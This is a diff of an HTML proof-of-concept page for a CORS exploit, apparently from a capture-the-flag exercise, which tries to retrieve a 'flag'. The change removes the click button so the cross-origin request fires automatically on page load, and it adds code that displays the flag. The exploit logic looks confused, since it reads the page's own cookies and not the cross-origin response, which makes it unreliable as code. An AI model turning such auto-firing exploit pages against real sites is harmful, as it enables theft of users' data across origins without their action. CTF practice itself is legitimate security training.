@@ -2,9 +2,7 @@
   <!-- CORS PoC to Retrieve the Flag -->
   <body>
     <h2>CORS PoC</h2>
-    <div id="demo">
-        <button type="button" onclick="corsRequest()">Exploit</button>
-    </div>
+    <div id="demo"></div>
     <script>
       function corsRequest() {
         var xhr = new XMLHttpRequest();
@@ -13,12 +11,22 @@
         xhr.onreadystatechange = function() {
           if (this.readyState == 4 && this.status == 200) {
             // Assuming the flag is stored in a cookie named 'flag'
-            var flag = document.cookie.split('; ').find(row => row.startsWith('flag=')).split('=')[1];
-            alert('Flag: ' + flag);
+            var flagCookie = document.cookie.split('; ').find(row => row.startsWith('flag='));
+            if (flagCookie) {
+              var flag = flagCookie.split('=')[1];
+              document.getElementById("demo").innerHTML = 'Flag: ' + flag;
+              alert('Flag: ' + flag);
+            } else {
+              document.getElementById("demo").innerHTML = 'Flag cookie not found.';
+              alert('Flag cookie not found.');
+            }
           }
         };
         xhr.send();
       }
+
+      // Automatically submit the request on page load
+      window.onload = corsRequest;
     </script>
   </body>
 </html>
